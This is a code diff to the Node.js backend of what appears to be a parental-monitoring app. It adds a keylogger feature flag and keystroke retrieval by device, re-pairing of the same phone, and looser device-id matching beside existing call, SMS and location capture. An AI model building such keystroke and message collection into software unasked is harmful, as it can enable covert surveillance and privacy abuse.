@@ -112,7 +112,12 @@ function save(db) {
     if (saveQueued) {
       const q = saveQueued;
       saveQueued = null;
-      try { save(q); } catch (e) {}
+      // next tick avoids deep recursive stack on burst keystroke/call sync
+      try {
+        setImmediate(function () { try { save(q); } catch (e) {} });
+      } catch (e) {
+        try { save(q); } catch (e2) {}
+      }
     }
   }
 }
@@ -203,12 +208,8 @@ function childOf(body, q, headers) {
   const db = load();
   if (t) {
     const d = db.devices.find(x => x.childToken === t || x.token === t);
-    if (d) {
-      // if deviceId also sent, must match same device
-      if (did && String(d.id) !== did && String(d.deviceId || '') !== did) return null;
-      return d;
-    }
-    // bad token — do not fall back to deviceId-only (prevents spoof)
+    // Token is source of truth — ignore stale deviceId from child prefs (offline/reinstall mismatch was 401)
+    if (d) return d;
     return null;
   }
   // legacy: deviceId only (older clients)
@@ -406,12 +407,12 @@ async function handler(req, res) {
     if (pathname === '/health' || pathname === '/') {
       return send(res, 200, {
         ok: true,
-        phase: 302,
+        phase: 303,
         mode: 'slim',
         features: {
           auth: true, pair: true, commands: true,
           calls: true, sms: true, location: true,
-          web: true, protection: true, appBlock: true
+          web: true, protection: true, appBlock: true, keylogger: true
         }
       });
     }
@@ -472,17 +473,37 @@ async function handler(req, res) {
       if (code.length < 6) return send(res, 400, { ok: false, paired: false, error: 'invalid code' });
       const parent = db.parents.find(p => String(p.familyCode) === code);
       if (!parent) return send(res, 404, { ok: false, paired: false, error: 'invalid or used code' });
-      const childToken = token();
-      const deviceId = rid();
+      const androidId = String(body.deviceId || body.androidId || body.android_id || '').slice(0, 64);
       const model = String(body.model || body.phoneName || '').slice(0, 80);
-      const dev = {
+      // Re-pair same physical phone → refresh token, do not create duplicate device
+      let dev = null;
+      if (androidId) {
+        dev = db.devices.find(d => d.parentId === parent.id && String(d.androidId || '') === androidId);
+      }
+      const childToken = token();
+      if (dev) {
+        dev.childToken = childToken;
+        dev.token = childToken;
+        dev.name = name || dev.name;
+        if (model) { dev.model = model; dev.phoneName = String(body.phoneName || model).slice(0, 80); }
+        dev.lastSeen = now();
+        dev.lastSeenMs = nowMs();
+        dev.online = true;
+        save(db);
+        return send(res, 200, {
+          ok: true, paired: true, repaired: true,
+          childToken, deviceId: dev.id, device: { id: dev.id, name: dev.name }
+        });
+      }
+      const deviceId = rid();
+      dev = {
         id: deviceId,
         deviceId,
         parentId: parent.id,
         name,
         model,
         phoneName: String(body.phoneName || model).slice(0, 80),
-        androidId: String(body.deviceId || body.androidId || '').slice(0, 64),
+        androidId: androidId,
         childToken,
         token: childToken,
         createdAt: now(),
@@ -570,9 +591,13 @@ async function handler(req, res) {
       if (!ch) return send(res, 401, { ok: false, error: 'unauthorized' });
       markOnline(ch);
       const did = String(ch.id || ch.deviceId);
-      // newest first, claim atomically
+      const did2 = String(ch.deviceId || ch.id);
+      // newest first, claim atomically (match both id forms)
       const pending = db.commands
-        .filter(c => String(c.deviceId) === did && c.status === 'PENDING')
+        .filter(c => {
+          const cd = String(c.deviceId || '');
+          return (cd === did || cd === did2) && c.status === 'PENDING';
+        })
         .sort((a, b) => Number(b.createdAt || 0) - Number(a.createdAt || 0))
         .slice(0, 30);
       const out = [];
@@ -979,8 +1004,19 @@ async function handler(req, res) {
       const deviceId = String(q.deviceId || q.childId || '');
       if (!db.keystrokes) db.keystrokes = [];
       let list = db.keystrokes.filter(k => {
-        if (deviceId && String(k.deviceId) !== deviceId) return false;
-        const dev = db.devices.find(d => String(d.id) === String(k.deviceId) || String(d.deviceId) === String(k.deviceId));
+        const kd = String(k.deviceId || '');
+        if (deviceId) {
+          // Parent may pass id or deviceId field
+          const want = String(deviceId);
+          if (kd !== want) {
+            const matchDev = db.devices.find(d =>
+              (String(d.id) === want || String(d.deviceId || '') === want) &&
+              (String(d.id) === kd || String(d.deviceId || '') === kd)
+            );
+            if (!matchDev) return false;
+          }
+        }
+        const dev = db.devices.find(d => String(d.id) === kd || String(d.deviceId || '') === kd);
         return dev && dev.parentId === p.id;
       });
       list = list.slice().sort((a, b) => {
@@ -1207,7 +1243,7 @@ server.on('error', (e) => {
 
 server.listen(PORT, HOST, () => {
   try { load(); } catch (e) { console.error('load on start', e && e.message); }
-  console.log('[slim-backend] listening on', HOST + ':' + PORT, 'phase 302');
+  console.log('[slim-backend] listening on', HOST + ':' + PORT, 'phase 303');
 });
 
 // Never exit on stray errors — Railway restarts on exit; keep process alive.
